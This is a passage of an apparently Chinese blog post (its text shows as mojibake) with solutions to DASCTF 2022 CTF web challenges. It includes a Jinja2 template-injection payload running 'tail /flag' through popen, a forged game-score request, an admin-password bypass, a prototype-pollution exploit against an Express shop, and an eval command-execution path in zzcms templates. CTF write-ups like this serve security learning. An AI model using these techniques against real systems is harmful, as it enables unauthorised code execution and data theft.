<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;% print ().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](\&quot;tail /flag\&quot;).read() %&#125;&quot;[::-1]</span><br><span class="line">#: &#125;% )(daer.)&quot;galf/ liat&quot;(]&#x27;nepop&#x27;[__slabolg__.__tini__.]231[)(__sessalcbus__.]0[__sesab__.__ssalc__.)( tnirp %&#123;</span><br></pre></td></tr></table></figure>

<img src="/2022/09/18/dasctf202209/3.png" class="">

<h2 id="dino3d"><a href="#dino3d" class="headerlink" title="dino3d"></a>dino3d</h2><p>å‰ç«¯jså°æ¸¸æˆï¼Œéœ€è¦æ‹¿åˆ°1000000åˆ†æ‰èƒ½é€šå…³ï¼Œå®¡è®¡ä¸€ä¸‹jsä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> salt = <span class="string">&quot;_wElc03e&quot;</span>;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">var</span> checkCode = <span class="string">&quot;DASxCBCTF&quot;</span> + salt;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">return</span> game.<span class="title function_">sn</span>(score.<span class="property">score</span>, checkCode),</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="title function_">sn</span>(<span class="params">e, t</span>) &#123;</span><br><span class="line">        e &amp;&amp; t &amp;&amp; <span class="title function_">fetch</span>(<span class="string">&quot;/check.php&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: <span class="string">&quot;score=&quot;</span> + <span class="built_in">parseInt</span>(e).<span class="title function_">toString</span>() + <span class="string">&quot;&amp;checkCode=&quot;</span> + <span class="title function_">md5</span>(<span class="built_in">parseInt</span>(e).<span class="title function_">toString</span>() + t) + <span class="string">&quot;&amp;tm=&quot;</span> + (+<span class="keyword">new</span> <span class="title class_">Date</span>).<span class="title function_">toString</span>().<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">10</span>)</span><br><span class="line">        &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span>e.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">e</span>=&gt;</span><span class="title function_">alert</span>(e))</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>æ¯æ¬¡æ¸¸æˆæœ€ç»ˆä¼šå‘é€åˆ†æ•°åˆ°check.phpï¼ˆeæ˜¯åˆ†æ•°ï¼Œtæ˜¯saltï¼‰ï¼Œè¿™é‡Œè¿˜æ·»åŠ äº†checkCodeå‚æ•°ï¼Œå†…å®¹æŸ¥æ‰¾ä»£ç å¯ä»¥æ‰¾åˆ°å®šä¹‰.</p>
<p><strong>è§£æ³•ä¸€</strong></p>
<p>æŒ‰ç…§æˆ‘ä»¬ä¸Šæ–‡çš„åˆ†æï¼Œæ„é€ æŠ¥æ–‡å³å¯</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;score=&quot; + parseInt(1000000).toString() + &quot;&amp;checkCode=&quot; + md5(parseInt(1000000).toString() + &quot;DASxCBCTF_wElc03e&quot;) + &quot;&amp;tm=&quot; + (+new Date).toString().substring(0, 10)</span><br></pre></td></tr></table></figure>

<img src="/2022/09/18/dasctf202209/4.png" class="">

<p>ä½†æ˜¯å‘åŒ…åä¼šæŠ¥é”™ï¼ŒçŒœæµ‹æ˜¯æ—¶é—´æˆ³ä¸æ­£ç¡®ï¼Œæ‰€ä»¥æˆ‘ä»¬æ‰¾ä¸€ä¸ªå½“å‰æ—¶é—´å¾€åå‡ ç§’çš„æ—¶é—´æˆ³æ¥ç”Ÿæˆpayloadï¼Œç„¶åé‡å¤å‘åŒ…å³å¯</p>
<img src="/2022/09/18/dasctf202209/5.png" class="">

<p><strong>è§£æ³•äºŒ</strong></p>
<p>æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç»™è¿™æ®µä»£ç ä¸‹æ–­ç‚¹ï¼Œå°†scoreåˆ†æ•°ä¿®æ”¹æˆ100000å³å¯é€šå…³</p>


<p>åˆ°æ–­ç‚¹ï¼Œä¿®æ”¹æ¸¸æˆå¾—åˆ†å³å¯</p>
<img src="/2022/09/18/dasctf202209/7.png" class="">

<img src="/2022/09/18/dasctf202209/8.png" class="">

<h2 id="cbshop"><a href="#cbshop" class="headerlink" title="cbshop"></a>cbshop</h2><p>ç»™å‡ºäº†ä»£ç ï¼Œexpressæ¡†æ¶ï¼Œçœ‹ä»£ç å¯çŸ¥ç™»å½•è¦æ‹¿åˆ°flagéœ€è¦money&gt;10ï¼Œæ™®é€šç”¨æˆ·moneyåªæœ‰10ï¼Œå¿…é¡»ç”¨adminç™»å½•ï¼Œé¢˜ç›®ç»™å‡ºäº†adminå¯¹è±¡ä¿¡æ¯å’Œç™»å½•ä»£ç </p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> adminUser = &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&quot;ğŸ˜€adminğŸ˜€&quot;</span>,</span><br><span class="line">    <span class="attr">money</span>: <span class="number">9999</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> username = req.<span class="property">body</span>.<span class="property">username</span>;</span><br><span class="line">    <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> username !== <span class="string">&#x27;string&#x27;</span> || username === <span class="string">&#x27;&#x27;</span> || <span class="keyword">typeof</span> password !== <span class="string">&#x27;string&#x27;</span> || password === <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">code</span>: <span class="number">4</span>, <span class="attr">msg</span>: <span class="string">&#x27;illegal username or password!&#x27;</span>&#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username === adminUser.<span class="property">username</span> &amp;&amp; password === adminUser.<span class="property">password</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>)) &#123;<span class="comment">//only admin need password</span></span><br><span class="line">        req.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        req.<span class="property">session</span>.<span class="property">money</span> = adminUser.<span class="property">money</span>;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">username</span>: username,</span><br><span class="line">            <span class="attr">money</span>: req.<span class="property">session</span>.<span class="property">money</span>,</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&#x27;admin login success!&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¯¹å¯†ç æˆªå–äº†ç¬¬1åˆ°6ä½ï¼Œæˆ‘ä»¬ä¹Ÿåœ¨jsæˆªå–ä¸€ä¸‹å³å¯</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;ğŸ˜€adminğŸ˜€&quot;</span>.<span class="title function_">substring</span>(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line"><span class="comment">// &#x27;\uDE00admi&#x27;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åæŒ‰ç…§è¿™ä¸ªå¯†ç ç™»å½•å³å¯ï¼Œè®°å¾—è½¬ä¹‰ç¬¦åˆ«è¢«äºŒæ¬¡è½¬ä¹‰ã€‚</p>
<p>æŸ¥çœ‹ä»£ç å¯ä»¥çŸ¥é“getflagå¤„å­˜åœ¨åŸå‹é“¾æ±¡æŸ“</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> order = &#123;&#125;;</span><br><span class="line"><span class="keyword">if</span>(!order[user.<span class="property">username</span>]) &#123;</span><br><span class="line">    order[user.<span class="property">username</span>] = &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//è´­ä¹°å•†å“çš„æ¥å£</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">buyApi</span>(<span class="params">user, product</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> order = &#123;&#125;;</span><br><span class="line">    <span class="keyword">if</span>(!order[user.<span class="property">username</span>]) &#123;</span><br><span class="line">        order[user.<span class="property">username</span>] = &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(order[user.<span class="property">username</span>], product);  <span class="comment">//åŸå‹é“¾æ±¡æŸ“</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(product.<span class="property">id</span> === <span class="number">1</span>) &#123;             <span class="comment">//buy fakeFlag</span></span><br><span class="line">        <span class="keyword">if</span>(user.<span class="property">money</span> &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">            user.<span class="property">money</span> -= <span class="number">10</span>;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order, &#123; <span class="attr">msg</span>:  fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/fakeFlag&#x27;</span>).<span class="title function_">toString</span>() &#125;);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;you don&#x27;t have enough money!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(product.<span class="property">id</span> === <span class="number">2</span>) &#123;        <span class="comment">//buy flag</span></span><br><span class="line">        <span class="keyword">if</span>(user.<span class="property">money</span> &gt;= <span class="number">11</span> &amp;&amp; user.<span class="property">token</span>) &#123;  <span class="comment">//do u have token?</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                user.<span class="property">money</span> -= <span class="number">11</span>;</span><br><span class="line">                <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: fs.<span class="title function_">readFileSync</span>(product.<span class="property">name</span>).<span class="title function_">toString</span>() &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;nononono!&quot;</span> &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">code</span>: <span class="number">0</span>, <span class="attr">msg</span>: <span class="string">&quot;no such product!&quot;</span> &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(order, &#123; <span class="attr">username</span>: user.<span class="property">username</span>, <span class="attr">code</span>: <span class="number">3</span>, <span class="attr">money</span>: user.<span class="property">money</span> &#125;);</span><br><span class="line">    <span class="keyword">return</span> order;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>buyApiå‡½æ•°çš„userå’Œproductéƒ½ç”¨æˆ·å¯æ§ï¼Œè€ŒObject.assignå¤„å­˜åœ¨åŸå‹é“¾æ±¡æŸ“ï¼ŒæŸ¥çœ‹ä»£ç å¯ä»¥çŸ¥é“orderç»§æ‰¿äºObjectç±»ï¼Œæ‰€ä»¥è¦†ç›–orderçš„åŸå‹å°±ä¼šæ³¨å…¥å˜é‡åˆ°Objectç±»ä¸­ï¼Œè¿™æ ·å°±ä¼šç»™æ‰€æœ‰çš„ç±»å¢åŠ å±æ€§ï¼Œå¦‚æœæˆ‘ä»¬æ·»åŠ tokenå±æ€§çš„è¯æœ€ç»ˆuser.tokenå˜é‡å°±ä¼šå­˜åœ¨è¿™æ ·å¯ä»¥ç»•è¿‡åç»­çš„æ ¡éªŒ</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(user.<span class="property">money</span> &gt;= <span class="number">11</span> &amp;&amp; user.<span class="property">token</span>) &#123;  <span class="comment">//do u have token?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(product).<span class="title function_">includes</span>(<span class="string">&quot;flag&quot;</span>)) &#123;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;hint: go to &#x27;readFileSync&#x27;!!!!&quot;</span> &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        user.<span class="property">money</span> -= <span class="number">11</span>;</span><br><span class="line">        <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: fs.<span class="title function_">readFileSync</span>(product.<span class="property">name</span>).<span class="title function_">toString</span>() &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">assign</span>(order,&#123; <span class="attr">msg</span>: <span class="string">&quot;nononono!&quot;</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥çš„æ–‡ä»¶è¯»å–å¤„è¿‡æ»¤flagå­—æ®µï¼Œæˆ‘ä»¬å¯ä»¥ç”¨urlç¼–ç æ¥è¿›è¡Œç»•è¿‡ï¼ŒreadFileSyncæ”¯æŒfileåè®®è¯»å–æ–‡ä»¶ã€‚</p>
<p>é‚£ä¹ˆç¬¬ä¸€æ­¥ä¿®æ”¹ç”¨æˆ·åï¼Œæ›¿æ¢<code>user.username</code>å±æ€§ä¸º<code>__proto__</code>æ¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“</p>
<img src="/2022/09/18/dasctf202209/9.png" class="">

<p>æ¥ä¸‹æ¥åˆ©ç”¨åŸå‹é“¾æ±¡æŸ“æ³¨å…¥tokenå˜é‡</p>
<img src="/2022/09/18/dasctf202209/10.png" class="">

<p>æ¥ä¸‹æ¥æ‰§è¡Œbuyflagæ¥getflag</p>
<img src="/2022/09/18/dasctf202209/11.png" class="">

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;575faeb7-6d04-4fcd-82ad-d79c087a65fb&#125;</span><br></pre></td></tr></table></figure>

<h2 id="zzz-again"><a href="#zzz-again" class="headerlink" title="zzz_again"></a>zzz_again</h2><p>ä»£ç å®¡è®¡ï¼Œzzz_client.phpå½“locationä¸ºlistæ—¶ï¼Œä»£ç ä¼šè¿›å…¥åˆ°å¦‚ä¸‹æµç¨‹</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>(<span class="variable">$conf</span>[<span class="string">&#x27;runmode&#x27;</span>]==<span class="number">0</span>|| <span class="variable">$conf</span>[<span class="string">&#x27;runmode&#x27;</span>]==<span class="number">2</span> || <span class="variable">$location</span>==<span class="string">&#x27;search&#x27;</span> ||<span class="variable">$location</span>==<span class="string">&#x27;form&#x27;</span> ||<span class="variable">$location</span>==<span class="string">&#x27;screen&#x27;</span> || <span class="variable">$location</span>==<span class="string">&#x27;app&#x27;</span>)&#123;</span><br><span class="line">	<span class="variable">$zcontent</span> = <span class="title function_ invoke__">load_file</span>(<span class="variable">$tplfile</span>,<span class="variable">$location</span>);</span><br><span class="line">	<span class="variable">$parser</span> = <span class="keyword">new</span> <span class="title class_">ParserTemplate</span>();</span><br><span class="line">	<span class="variable">$zcontent</span> = <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parserCommom</span>(<span class="variable">$zcontent</span>); <span class="comment">// è§£ææ¨¡æ¿</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$zcontent</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>è·Ÿè¿›parserCommon()å‡½æ•°</p>
<img src="/2022/09/18/dasctf202209/13.png" class="">

<p>è·Ÿè¿›parserlocation-&gt;parserList-&gt;parserListPageï¼Œè¿™é‡Œæœ‰ä¸€å¤„è·å–uriçš„ä»£ç </p>
<img src="/2022/09/18/dasctf202209/14.png" class="">

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$out_html</span> = <span class="variable">$pagestyle</span>.<span class="string">&quot;&lt;div id=&#x27;pagesize&#x27;&gt;&lt;ul&gt;&quot;</span> . <span class="title function_ invoke__">pagination</span>( <span class="variable">$url</span>, <span class="variable">$totalnum</span>, <span class="variable">$page</span>, <span class="variable">$pagesize</span>, <span class="variable">$len</span>,<span class="variable">$style</span>  ) . <span class="string">&quot;&lt;/ul&gt;&lt;/div&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$zcontent</span> = <span class="title function_ invoke__">str_replace</span>( <span class="variable">$matches</span>[ <span class="number">0</span> ], <span class="variable">$out_html</span>, <span class="variable">$zcontent</span> );</span><br></pre></td></tr></table></figure>

<p>è·å–uriåä¼šç®€å•çš„å¢åŠ ä¸€äº›å†…å®¹ã€‚<br>ç„¶åè·Ÿè¿›parserIfLabelå‡½æ•°</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parserIfLabel</span>(<span class="params"> <span class="variable">$zcontent</span> </span>) </span>&#123;</span><br><span class="line">    <span class="variable">$pattern</span> = <span class="string">&#x27;/\&#123;if:([\s\S]+?)&#125;([\s\S]*?)&#123;end\s+if&#125;/&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match_all</span>( <span class="variable">$pattern</span>, <span class="variable">$zcontent</span>, <span class="variable">$matches</span> ) ) &#123;</span><br><span class="line">        <span class="variable">$count</span> = <span class="title function_ invoke__">count</span>( <span class="variable">$matches</span>[ <span class="number">0</span> ] );</span><br><span class="line">        <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span>++ ) &#123;</span><br><span class="line">            <span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$out_html</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="variable">$matches</span>[ <span class="number">1</span> ][ <span class="variable">$i</span> ];</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;==&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;&gt;&#x27;</span>, <span class="string">&#x27;!=&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;||&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;&amp;&amp;&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;mod&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="variable">$ifstr</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="variable">$ifstr</span> );</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">&#x27;==&#x27;</span>,<span class="string">&#x27;!=&#x27;</span>,<span class="string">&#x27;||&#x27;</span>,<span class="string">&#x27;&amp;&amp;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;!&#x27;</span>,<span class="string">&#x27;&gt;=&#x27;</span>,<span class="string">&#x27;&lt;=&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>) <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$ifstr</span>,<span class="variable">$v</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">                    <span class="variable">$arr</span>= <span class="title function_ invoke__">splits</span>(<span class="variable">$ifstr</span>,<span class="variable">$v</span>);</span><br><span class="line">                    <span class="variable">$arr1</span>=	<span class="title function_ invoke__">danger_key</span>(<span class="variable">$arr</span>[<span class="number">0</span>]);</span><br><span class="line">                    <span class="variable">$arr2</span>=	<span class="title function_ invoke__">danger_key</span>(<span class="variable">$arr</span>[<span class="number">1</span>]);</span><br><span class="line">                    <span class="variable">$arr0</span>=	<span class="variable">$v</span>;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">0</span>]==<span class="string">&#x27;&#x27;</span>) <span class="variable">$arr1</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$arr</span>[<span class="number">1</span>]==<span class="string">&#x27;&#x27;</span>) <span class="variable">$arr2</span>=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//echop($arr1 . $arr0 . $arr2);</span></span><br><span class="line">            <span class="keyword">if</span> ( <span class="title function_ invoke__">preg_match</span>( <span class="string">&#x27;/\&#123;|&#125;/&#x27;</span>, <span class="variable">$ifstr</span>)) &#123;    </span><br><span class="line">                <span class="title function_ invoke__">error</span>(<span class="string">&#x27;å¾ˆæŠ±æ­‰ï¼Œæ¨¡æ¿ä¸­æœ‰é”™è¯¯çš„åˆ¤æ–­,è¯·ä¿®æ­£&#x27;</span>.<span class="variable">$ifstr</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                @<span class="keyword">eval</span>( <span class="string">&#x27;if(&#x27;</span> .<span class="variable">$arr1</span> . <span class="variable">$arr0</span> . <span class="variable">$arr2</span>. <span class="string">&#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27;</span> );   <span class="comment">//å‘½ä»¤æ‰§è¡Œ</span></span><br><span class="line">            &#125; </span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œåªéœ€è¦ç»•è¿‡danger_keyçš„é»‘åå•å³å¯å‘½ä»¤æ‰§è¡Œ</p>
<img src="/2022/09/18/dasctf202209/12.png" class="">

<p>PSï¼šè¿™ä¸ªpayloadåœ¨å…¶ä»–æœºå™¨ä¸Šæµ‹è¯•å°±ä¼šå¤±è´¥ï¼ŒåŸå› æ˜¯zzcmså¯¹URIä¸ä¼šè¿›è¡Œurlè§£ç ï¼Œè€Œä¸”phpä¹Ÿä¸ä¼šå¯¹uriè¿›è¡Œè‡ªåŠ¨urlè§£ç ï¼Œæ‰€ä»¥å¦‚æœå¯¹uriè¿›è¡Œäº†ç¼–ç ï¼Œé‚£ä¹ˆparserIfLabelé‡Œé¢çš„æ­£åˆ™åŒ¹é…å°±ä¼šå¤±è´¥ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œevalå‡½æ•°ï¼Œä½†æ˜¯å¦‚æœuriä¸è¿›è¡Œç¼–ç ï¼Œç”±äºuriä¸­å­˜åœ¨ç©ºæ ¼ï¼Œå¯èƒ½å°±ä¼šå¯¼è‡´æŠ¥æ–‡é”™è¯¯ä»è€Œæ— æ³•æ‰§è¡Œå‘½ä»¤ã€‚æˆ‘å®é™…æµ‹è¯•åœ¨æŸäº›ç¯å¢ƒä¸‹å¯ä»¥ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹å°±ä¸è¡Œã€‚</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>aesm1p</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://example.com/2022/09/18/dasctf202209/">http://example.com/2022/09/18/dasctf202209/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2022 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/ctf/"># ctf</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>Â· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/10/30/DASCTF202210/">DASCTF2022-10æœˆèµ›é¢˜è§£</a>
            
            
            <a class="next" rel="next" href="/2022/09/05/wdb2022/">ç½‘é¼æ¯2022éƒ¨åˆ†é¢˜ç›®é¢˜è§£å¤ç°</a>
            
        </section>


    </article>
</div>

            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
